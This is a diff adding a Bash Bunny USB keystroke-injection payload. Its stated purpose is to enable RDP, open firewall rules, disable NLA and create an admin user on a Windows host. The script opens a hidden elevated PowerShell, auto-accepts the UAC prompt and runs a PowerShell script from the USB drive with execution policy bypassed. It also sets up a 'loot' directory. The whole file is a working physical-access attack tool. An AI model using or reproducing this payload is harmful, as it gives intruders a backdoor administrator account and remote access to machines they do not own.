@@ -1,0 +1,37 @@
+############################################################################################
+# Purpose: Enable RDP, fw rules and admin user. Disable NLA. Create admin user just in case.
+# Version: 1.0
+# Author: Mike Galvin
+# Contact: mike@gal.vin or twitter.com/mikegalvin_
+# Date: 2019-10-08
+#############################################################################################
+
+#!/bin/bash
+
+# Options
+LOOTDIR=/root/udisk/loot/badmin
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+######## MAKE LOOT DIRECTORY ########
+mkdir -p $LOOTDIR
+
+######## ATTACK ########
+LED ATTACK
+RUN WIN "powershell -windowstyle hidden start-process powershell -verb RunAs"
+sleep 3
+Q ALT Y
+sleep 2
+Q STRING "\$src = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\p.ps1'"
+Q ENTER
+sleep 1
+QUACK STRING "powershell -ep bypass \$src"
+Q ENTER
+Q STRING "exit"
+Q ENTER
+
+######## FINISH ########
+LED FINISH
